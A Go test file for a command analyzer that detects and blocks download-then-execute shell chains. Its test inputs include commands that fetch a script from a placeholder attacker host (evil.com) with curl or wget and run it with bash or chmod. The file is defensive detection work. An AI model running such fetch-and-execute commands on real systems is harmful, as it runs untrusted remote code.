package analyzer

import (
	"testing"
)

// ---------------------------------------------------------------------------
// Test: Stateful chain matching — basic
// ---------------------------------------------------------------------------

func TestStatefulRule_BasicChain(t *testing.T) {
	tests := []struct {
		name    string
		command string
		rule    StatefulRule
		want    bool
	}{
		{
			name:    "download && execute chain",
			command: "curl -o x.sh http://evil.com/x.sh && bash x.sh",
			rule: StatefulRule{
				Chain: []ChainStepRule{
					{ExecutableAny: []string{"curl", "wget"}},
					{ExecutableAny: []string{"bash", "sh", "chmod"}},
				},
			},
			want: true,
		},
		{
			name:    "download only — no execute step",
			command: "curl -o x.sh http://evil.com/x.sh",
			rule: StatefulRule{
				Chain: []ChainStepRule{
					{ExecutableAny: []string{"curl", "wget"}},
					{ExecutableAny: []string{"bash", "sh"}},
				},
			},
			want: false,
		},
		{
			name:    "three-step chain: download → chmod → execute",
			command: "wget -O payload.sh http://evil.com && chmod +x payload.sh && ./payload.sh",
			rule: StatefulRule{
				Chain: []ChainStepRule{
					{ExecutableAny: []string{"curl", "wget"}},
					{ExecutableAny: []string{"chmod"}},
					{ExecutableAny: []string{"./payload.sh"}},
				},
			},
			want: true,
		},
		{
			name:    "wrong order — execute before download",
			command: "bash x.sh && curl -o x.sh http://evil.com",
			rule: StatefulRule{
				Chain: []ChainStepRule{
					{ExecutableAny: []string{"curl", "wget"}},
					{ExecutableAny: []string{"bash", "sh"}},
				},
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := parseCommand(t, tt.command)
			got := MatchStatefulRule(parsed, tt.rule)
			if got != tt.want {
				t.Errorf("MatchStatefulRule(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Test: Stateful chain with flag predicates
// ---------------------------------------------------------------------------

func TestStatefulRule_FlagsInChain(t *testing.T) {
	tests := []struct {
		name    string
		command string
		rule    StatefulRule
		want    bool
	}{
		{
			name:    "curl with -o flag followed by bash",
			command: "curl -o script.sh http://evil.com && bash script.sh",
			rule: StatefulRule{
				Chain: []ChainStepRule{
					{ExecutableAny: []string{"curl", "wget"}, FlagsAny: []string{"o", "O", "output"}},
					{ExecutableAny: []string{"bash", "sh", "zsh"}},
				},
			},
			want: true,
		},
		{
			name:    "curl without -o flag — no match",
			command: "curl http://example.com && bash script.sh",
			rule: StatefulRule{
				Chain: []ChainStepRule{
					{ExecutableAny: []string{"curl"}, FlagsAny: []string{"o", "O", "output"}},
					{ExecutableAny: []string{"bash"}},
				},
			},
			want: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			parsed := parseCommand(t, tt.command)
			got := MatchStatefulRule(parsed, tt.rule)
			if got != tt.want {
				t.Errorf("MatchStatefulRule(%q) = %v, want %v", tt.command, got, tt.want)
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Test: Stateful negate
// ---------------------------------------------------------------------------

func TestStatefulRule_Negate(t *testing.T) {
	rule := StatefulRule{
		Chain: []ChainStepRule{
			{ExecutableAny: []string{"curl", "wget"}},
			{ExecutableAny: []string{"bash", "sh"}},
		},
		Negate: true,
	}

	// Download→execute chain present → negated = false
	parsed := parseCommand(t, "curl -o x.sh http://evil.com && bash x.sh")
	if MatchStatefulRule(parsed, rule) {
		t.Error("expected negated rule to NOT match for download→execute chain")
	}

	// No chain → negated = true (ALLOW override)
	parsed2 := parseCommand(t, "ls -la")
	if !MatchStatefulRule(parsed2, rule) {
		t.Error("expected negated rule to match for safe command")
	}
}

// ---------------------------------------------------------------------------
// Test: Stateful nil/empty cases
// ---------------------------------------------------------------------------

func TestStatefulRule_EdgeCases(t *testing.T) {
	rule := StatefulRule{
		Chain: []ChainStepRule{
			{ExecutableAny: []string{"curl"}},
			{ExecutableAny: []string{"bash"}},
		},
	}

	// Nil parsed
	if MatchStatefulRule(nil, rule) {
		t.Error("expected false for nil parsed")
	}

	// Empty chain
	emptyRule := StatefulRule{Chain: nil}
	parsed := parseCommand(t, "ls -la")
	if MatchStatefulRule(parsed, emptyRule) {
		t.Error("expected false for empty chain")
	}
}

// ---------------------------------------------------------------------------
// Test: StatefulAnalyzer integration with user rules
// ---------------------------------------------------------------------------

func TestStatefulAnalyzer_UserRules(t *testing.T) {
	sa := NewStructuralAnalyzer(2)
	sf := NewStatefulAnalyzer(nil)
	sf.SetUserRules([]StatefulRule{
		{
			ID:         "user-block-download-execute",
			Decision:   "BLOCK",
			Confidence: 0.90,
			Reason:     "user rule: download then execute chain",
			Chain: []ChainStepRule{
				{ExecutableAny: []string{"curl", "wget"}, FlagsAny: []string{"o", "O"}},
				{ExecutableAny: []string{"bash", "sh", "chmod"}},
			},
		},
	})

	tests := []struct {
		name       string
		command    string
		wantRuleID string
	}{
		{
			name:       "curl -o then bash triggers user rule",
			command:    "curl -o x.sh http://evil.com && bash x.sh",
			wantRuleID: "user-block-download-execute",
		},
		{
			name:       "safe command — no chain",
			command:    "ls -la",
			wantRuleID: "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			ctx := &AnalysisContext{RawCommand: tt.command}
			ctx.Parsed = sa.Parse(tt.command)
			findings := sf.Analyze(ctx)

			found := false
			for _, f := range findings {
				if f.RuleID == tt.wantRuleID {
					found = true
				}
			}

			if tt.wantRuleID != "" && !found {
				t.Errorf("expected finding %q, got %v", tt.wantRuleID, findingIDs(findings))
			}
			if tt.wantRuleID == "" {
				for _, f := range findings {
					if f.RuleID == "user-block-download-execute" {
						t.Errorf("unexpected user rule finding: %s", f.RuleID)
					}
				}
			}
		})
	}
}

// ---------------------------------------------------------------------------
// Test: countSegmentSteps helper
// ---------------------------------------------------------------------------

func TestCountSegmentSteps(t *testing.T) {
	tests := []struct {
		name  string
		chain []ChainStepRule
		want  int
	}{
		{
			name:  "two segment steps",
			chain: []ChainStepRule{{ExecutableAny: []string{"curl"}}, {ExecutableAny: []string{"bash"}}},
			want:  2,
		},
		{
			name:  "empty chain",
			chain: nil,
			want:  0,
		},
		{
			name: "mixed segment and operator-only steps",
			chain: []ChainStepRule{
				{ExecutableAny: []string{"curl"}},
				{Operator: "&&"},
				{ExecutableAny: []string{"bash"}},
			},
			want: 2,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := countSegmentSteps(tt.chain)
			if got != tt.want {
				t.Errorf("countSegmentSteps() = %d, want %d", got, tt.want)
			}
		})
	}
}
